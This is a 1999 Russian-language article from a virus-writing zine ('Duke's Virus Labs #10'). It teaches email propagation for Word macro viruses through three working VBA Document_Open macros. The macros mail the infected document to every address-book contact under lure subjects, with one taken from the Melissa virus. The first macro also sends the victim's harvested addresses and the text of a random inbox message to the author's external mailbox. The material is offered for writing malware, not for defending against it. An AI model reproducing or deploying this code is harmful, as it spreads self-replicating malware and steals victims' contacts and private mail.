- [Duke's Virus Labs #10] - [Page 29] -

Electronic mail propagation
(c) by ULTRS/MATRiX

В этой статье я расскажу и покажу как написать алгоритм посылки писем.
Cпособ посылки зараженного документа по почте. Алгоритмы работы довольно 
просты и почти ничем не отличаются друг от друга. 

Первый метод
~~~~~~~~~~~~

При открытий документа он посылает свою копию каждому пользователю который 
записан в адресной книге, так же отсылает автору письмо в котором описаны все 
адреса e-mail и другую информацию. При посылки генерируется текст и названия 
письма.

Sub Document_Open()
Randomize
SubjectLines = Array("Easy Money", "Important Info", "Windows 2000", "Check this out!", "You are winner!")
'заголовок сообщения
ContentLines = Array("How earn quickly money", "Important Info...", "New operation system!!!", "Check this out!", "You are winner!")
'текст сообщения
MesNum = Int(Rnd * 4)
'генерируем сообщение 1-4
CRLF = Chr(13) + Chr(10)
Set MAPISess = CreateObject("MAPI.Session")
'открываем процедуру MAPI
MAPISess.Logon
MesContent = CRLF + ContentLines(MesNum) + CRLF + CRLF + MAPISess.CurrentUser
'наше сообщение
Set ChainMes = MAPISess.Outbox.Messages.Add(SubjectLines(MesNum), MesContent)
'добавляем сообщение и вписываем текст, заголовок нашего письма
Set objRecipients = ChainMes.Recipients
For Each AdrEntry In MAPISess.AddressLists(1).AddressEntries
Set Recp = objRecipients.Add(Name:=AdrEntry.Address, Type:=3)
'параметры письма
GInfo = GInfo + AdrEntry.Address + ";"
Next
'далее
Set objAttach = ChainMes.Attachments.Add
objAttach.Type = 1
'прочие письма
objAttach.Source = ActiveDocument.FullName
'посылаем активный документ 
objAttach.Position = 0
objAttach.Name = MAPISess.CurrentUser
GInfo = GInfo + CRLF + CRLF + MAPISess.Inbox.Messages(Int(Rnd * MAPISess.Inbox.Messages.Count) + 1).Text + CRLF
GInfo = GInfo + "Thank you for use this is..."
'благодарность
Set Retr = MAPISess.Outbox.Messages.Add(MAPISess.CurrentUser, GInfo)
Set Recp = Retr.Recipients.Add(Name:="zooo@hotmail.com")
'посылаем копию автору
Retr.Send
'пошлем сообщение
ChainMes.Send
'еще одно пошлем
MAPISess.Logoff
'завершим работу MAPI
End Sub

Второй метод
~~~~~~~~~~~~

Это метод взят из вируса Melissa. Документ вызывает MS Outlook, считывает из 
базы адресов Outlook адресаэлектронной почты и посылает по этим адресам 
сообщение. 

Это сообщение содержит:

Тема: "Important Message From [UserName]" (UserName берется из базы адресов)
Тело письма: "Here is that document you asked for ... don't show anyone else ;-)"

К сообщению также присоединен документ, отылает документ & сообщение по 50 
первым адресам.


Sub Document_Open()
Randomize
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
'открываем outlook
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
'проверим использует электронную почту вирус
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by Kwyjibo" Then
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
'список в адресной книге
For y = 1 To DasMapiName.AddressLists.Count
Set AddyBook = DasMapiName.AddressLists(y)
x = 1
Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
BreakUmOffASlice.Recipients.Add Peep
x = x + 1
'если меньше 50 адресов, отсылает сообщение на все из них
If x > 50 Then oo = AddyBook.AddressEntries.Count
Next oo
'записываем в subject
BreakUmOffASlice.Subject = "Important Message From " & Application.UserName
'запишем информацию
BreakUmOffASlice.Body = "Here is that document you asked for ... don't show anyone else ;-)"
'засуним в месаг наш документ
BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
'пошлем сообщение
BreakUmOffASlice.Send
Peep = ""
Next y
DasMapiName.Logoff
End If
'поставим метку в системном реестре что вирус послал по мылу сови копии
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") = "... by Kwyjibo"
End If
End Sub

Третий метод
~~~~~~~~~~~~

При открытий документа он посылает свою копию каждому пользователю который 
записан в адресной книге. Очень похож на выше указанные методы, но более 
оптимизирован.

Sub Document_Open()
Randomize
On error resume next
Set zzzO = CreateObject("Outlook.Application")
'откроем Outlook
Set zzzMAPI = zzzO.GetNameSpace("MAPI")
'проверим использует электронную почту вирус
For Each zzzAddy In zzzMAPI.AddressLists
If zzzAddy.AddressEntries.Count > 0 Then
Set zzzCI = zzzO.CreateItem(0)
For zzzLoop = 1 To zzzAddy.AddressEntries.Count
Set zzzCount = zzzAddy.AddressEntries(zzzLoop)
If zzzLoop = 1 Then
zzzCI.BCC = zzzCount.Address
Else
zzzCI.BCC = zzzCI.BCC & "; " & zzzCount.Address
End If
Next
zzzCI.Subject = "SuBject"
'записываем в subject
zzzCI.Body = "Body !!!!!!!"
'запишем информацию
zzzCI.Attachments.Add ActiveDocument.FullName
'засуним в месаг наш документ
zzzCI.DeleteAfterSubmit = True
zzzCI.Send
End If
Next
End Sub


-=U=- aka ULTRAS (c)1999
from Russia with love!!!
